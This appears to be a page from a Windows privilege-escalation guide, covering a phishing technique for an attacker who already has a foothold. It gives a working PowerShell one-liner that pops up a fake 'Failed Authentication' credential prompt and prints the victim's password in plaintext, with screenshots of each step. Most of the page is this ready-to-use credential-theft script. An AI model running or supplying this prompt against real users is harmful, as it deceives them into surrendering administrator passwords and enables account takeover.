# Phishing

As a last resort, when all other privilege escalation options have been exhausted, phishing attacks can be used to trick the user into entering administrator credentials by posing as a legitimate request. This technique can raise suspicion due to unusual behavior and may jeopardize the initial foothold.

### Attack

The following script will prompt the user to input their credentials, masquerading as a legitimate application:

```powershell
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password

# To collect the credentials
$cred.GetNetworkCredential() | fl
```

## Example

Initially, copy and paste the first line of the suggested script.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/others/phising_1.png)

When executed, a prompt will appear on the user's screen asking for credentials to access something.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/others/phising_2.png)

If the victim falls for it and types in their credentials, they will be recovered using the second line of the suggested script.

![](https://daniel10barredo.github.io/PrivEscAssist_Windows/media/imag/others/phising_3.png)
